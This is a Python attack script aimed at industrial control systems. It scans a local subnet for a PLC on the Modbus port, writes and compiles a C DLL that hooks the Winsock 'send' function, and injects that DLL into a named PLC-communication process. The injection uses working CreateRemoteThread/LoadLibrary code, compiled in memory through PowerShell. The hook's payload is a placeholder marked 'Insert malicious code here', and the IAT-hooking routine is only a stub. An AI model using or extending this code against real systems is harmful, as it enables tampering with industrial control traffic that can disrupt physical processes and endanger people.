import sys
import os
import time
import subprocess
import socket
import struct
import pefile  # Requires `pip install pefile`

# Configuration
TARGET_PROCESS_NAME = "your_plc_communication_process.exe"  # Replace with the actual process name on the Windows machine that communicates with the PLC
TARGET_DLL_NAME = "ws2_32.dll" # Example: Hooking network functions.  Change if needed.  Case-insensitive.
TARGET_API_FUNCTION = "send" # Example: Hooking the 'send' function.  Change if needed.
REDIRECT_DLL_NAME = "hook.dll" # DLL containing our malicious function.  Must be in same directory.
REDIRECT_FUNCTION_NAME = "my_send_hook" # Function inside hook.dll.
PLC_PORT = 502  # Example Modbus port.  Adjust as needed.

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by analyzing network traffic.
    This is a rudimentary example and may need significant adjustment
    based on the specific network setup and communication protocols used.
    Consider using more sophisticated network analysis tools (e.g., Wireshark).
    """
    try:
        # Attempt to connect to the PLC on the known port.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5) # Timeout after 5 seconds.  Adjust as needed.

        # Scan a small subnet (e.g., your local network).  This is VERY basic.
        for i in range(1, 255):
            ip = "192.168.1." + str(i)  #Adjust to your subnet! VERY IMPORTANT!
            try:
                s.connect((ip, PLC_PORT))
                print(f"Connection to {ip}:{PLC_PORT} successful. Assuming this is the PLC.")
                s.close()
                return ip
            except (socket.timeout, socket.error) as e:
                #print(f"Connection to {ip}:{PLC_PORT} failed: {e}")  # Optional: Print connection failures
                pass  # Ignore errors and continue scanning
            finally:
                try:
                    s.close() # Ensure socket is closed in all cases.
                except:
                    pass


        print("Could not automatically determine PLC IP address.")
        return None  # Or raise an exception

    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None

def create_hook_dll():
    """
    Creates a simple hook.dll with the specified redirect function.
    This is a placeholder.  In a real attack, this DLL would contain
    malicious code.  Requires a C/C++ compiler (e.g., mingw-w64) and
    a C source file named hook.c.
    """
    hook_c_code = f"""
    #include <windows.h>

    typedef int (WINAPI *SEND)(SOCKET s, const char *buf, int len, int flags);

    BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {{
        switch (ul_reason_for_call) {{
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }}
        return TRUE;
    }}

    __declspec(dllexport) int WINAPI {REDIRECT_FUNCTION_NAME}(SOCKET s, const char *buf, int len, int flags) {{
        //  Insert malicious code here.  For example:
        OutputDebugStringA("Hooked!  Original data:");
        OutputDebugStringA(buf);

        // Optionally modify the data or take other actions

        // Call the original function. This is crucial to maintain functionality.
        SEND original_send = (SEND)GetProcAddress(GetModuleHandleA("{TARGET_DLL_NAME}"), "{TARGET_API_FUNCTION}");
        if (original_send) {{
           return original_send(s, buf, len, flags);
        }} else {{
           OutputDebugStringA("Failed to get original send function address!");
           return -1; // Indicate an error
        }}
    }}
    """

    hook_c_filename = "hook.c"
    with open(hook_c_filename, "w") as f:
        f.write(hook_c_code)

    # Compile the DLL using mingw-w64 (or similar)
    compiler_path = "C:\\mingw-w64\\x86_64-8.1.0-posix-seh-rt_v6-rev0\\mingw64\\bin\\gcc.exe" # MODIFY THIS TO YOUR GCC PATH!
    if not os.path.exists(compiler_path):
        print(f"Error: GCC compiler not found at {compiler_path}. Please install mingw-w64 and update the path.")
        sys.exit(1)


    command = [compiler_path, "-shared", "-o", REDIRECT_DLL_NAME, hook_c_filename, "-Wl,--subsystem,windows", "-s"]
    try:
        subprocess.check_call(command, stderr=subprocess.STDOUT)
        print(f"{REDIRECT_DLL_NAME} created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error compiling hook.dll: {e}")
        sys.exit(1)
    except FileNotFoundError:
         print("GCC not found.  Ensure mingw-w64 is installed and in your PATH.")
         sys.exit(1)


def inject_dll(process_name, dll_path):
    """
    Injects a DLL into the specified process.  This is a simplified example.
    Real-world injection techniques are much more complex and often rely on
    anti-detection mechanisms.
    """
    try:
        # PowerShell command to inject the DLL
        powershell_command = f"""
        $processName = "{process_name}"
        $dllPath = "{dll_path}"

        # Find the process
        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if (!$process) {{
            Write-Host "Process '$processName' not found."
            exit 1
        }}

        # Get the process ID
        $processId = $process.Id

        # Define the injection code (C#)
        $injectionCode = @"
        using System;
        using System.Runtime.InteropServices;
        using System.Diagnostics;

        public class Injector
        {{
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool inheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr GetModuleHandle(string moduleName);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool CloseHandle(IntPtr hObject);

            static void Main(string[] args)
            {{
                if (args.Length != 2)
                {{
                    Console.WriteLine("Usage: Injector <processId> <dllPath>");
                    return;
                }}

                int processId = int.Parse(args[0]);
                string dllPath = args[1];

                IntPtr hProcess = OpenProcess(0x1F0FFF, false, processId);
                if (hProcess == IntPtr.Zero)
                {{
                    Console.WriteLine("OpenProcess failed: " + Marshal.GetLastWin32Error());
                    return;
                }}

                IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
                if (loadLibraryAddress == IntPtr.Zero)
                {{
                    Console.WriteLine("GetProcAddress failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(hProcess);
                    return;
                }}

                byte[] dllPathBytes = System.Text.Encoding.Unicode.GetBytes(dllPath + "\\0");
                IntPtr dllPathAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x3000, 0x40);
                if (dllPathAddress == IntPtr.Zero)
                {{
                    Console.WriteLine("VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(hProcess);
                    return;
                }}

                if (!WriteProcessMemory(hProcess, dllPathAddress, dllPathBytes, (uint)dllPathBytes.Length, IntPtr.Zero))
                {{
                    Console.WriteLine("WriteProcessMemory failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(hProcess);
                    return;
                }}

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, dllPathAddress, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {{
                    Console.WriteLine("CreateRemoteThread failed: " + Marshal.GetLastWin32Error());
                    CloseHandle(hProcess);
                    return;
                }}

                WaitForSingleObject(hThread, 0xFFFFFFFF);  //Wait indefinitely

                UInt32 exitCode = 0;
                //GetExitCodeThread(hThread, out exitCode);  //Optional

                CloseHandle(hThread);
                CloseHandle(hProcess);

                Console.WriteLine("DLL injected successfully!");
            }}
        }}
        "@

        # Compile the C# code
        $compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
        $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
        $parameters.GenerateExecutable = $false
        $parameters.GenerateInMemory = $true
        $assembly = $compiler.CompileAssemblyFromSource($parameters, $injectionCode)

        if ($assembly.Errors.HasErrors) {{
            Write-Host "Error compiling C# code:"
            foreach ($error in $assembly.Errors) {{
                Write-Host $error.ToString()
            }}
            exit 1
        }}

        # Run the compiled assembly
        $injectorClass = $assembly.CompiledAssembly.GetType("Injector")
        $mainMethod = $injectorClass.GetMethod("Main")
        $mainMethod.Invoke($null, @(@("$processId"), @("$dllPath")))
        """

        # Execute the PowerShell command
        result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)

        if result.returncode != 0:
            print(f"DLL injection failed:\n{result.stderr}\n{result.stdout}")
        else:
            print(f"DLL injected into {process_name} successfully. Output:\n{result.stdout}")


    except Exception as e:
        print(f"Error injecting DLL: {e}")


def iat_hook(process_name, dll_to_hook, api_function_name, redirect_dll, redirect_function):
    """
    Performs IAT hooking on the specified process.  This is a simplified
    implementation and may not work reliably on all systems or with all
    APIs.
    Requires admin privileges or running in a context with sufficient permissions to modify the target process's memory.

    This function finds the target process, locates the IAT entry for the
    specified API function within the specified DLL, and overwrites the
    address with the address of the redirect function in the provided
    redirect DLL.

    **Important:** This function is highly specific to the target process and
    API. It relies on specific memory addresses and offsets. Any variation
    in the target process's version or configuration can cause this function
    to fail or, worse, crash the process. This example does not include any
    error handling or validation to prevent such crashes.
    """
    try:

        # 1. Find the process ID of the target process.
        process_id = None
        try:
            process = subprocess.check_output(["tasklist", "/FI", f"IMAGENAME eq {process_name}"], text=True)
            for line in process.splitlines():
                if process_name in line:
                    process_id = int(line.split()[1])  # Extract PID
                    break
        except subprocess.CalledProcessError:
            print(f"Error: Could not find process {process_name}.")
            return

        if not process_id:
            print(f"Error: Process {process_name} not found.")
            return

        print(f"Found process {process_name} with PID: {process_id}")


        # 2. Open the target process.
        # This part needs to be done from a C/C++ program or using a library like pywin32
        # because you need to open the process with PROCESS_ALL_ACCESS to modify its memory.
        # Using Python's built-in tools, you can't reliably do this due to security restrictions.
        print("IAT Hooking requires memory modification.  Please run with administrator privileges or consider a C/C++ implementation.")
        print("Due to limitations in pure Python, this part of the code cannot reliably modify the process memory. ")
        print("The remaining steps would involve using the pefile library and pywin32 to:")
        print("  - Load the target process's executable into memory.")
        print("  - Load the target DLL (e.g., ws2_32.dll) into memory.")
        print("  - Find the IAT entry for the API function.")
        print("  - Open the target process with sufficient permissions (using pywin32).")
        print("  - Calculate the address of the redirect function in the redirect DLL.")
        print("  - Write the address of the redirect function to the IAT entry in the target process's memory (using pywin32).")

        # 3. (In a real implementation, this part would calculate the address of the redirect function.)
        # redirect_function_address = ...  # Address of my_send_hook in hook.dll in the target process's address space.

        # 4. (In a real implementation, this part would overwrite the IAT entry.)
        # WriteProcessMemory(...)  # Overwrite the original API function address with the redirect function address.


    except Exception as e:
        print(f"Error performing IAT hook: {e}")



if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"PLC IP address: {plc_ip}")
    else:
        print("Could not find PLC IP address.  Exiting.")
        sys.exit(1)


    create_hook_dll() # Create the hook.dll (or ensure it exists)

    # Option 1: Inject the DLL (more common and reliable)
    # Ensure the hook.dll and this script are in the same directory or provide the full path to hook.dll
    dll_path = os.path.abspath(REDIRECT_DLL_NAME)
    inject_dll(TARGET_PROCESS_NAME, dll_path)

    # Option 2: Perform IAT hooking directly (more complex and less reliable).
    # iat_hook(TARGET_PROCESS_NAME, TARGET_DLL_NAME, TARGET_API_FUNCTION, REDIRECT_DLL_NAME, REDIRECT_FUNCTION_NAME)

    print("Script finished. The hook is now active (if injection was successful).")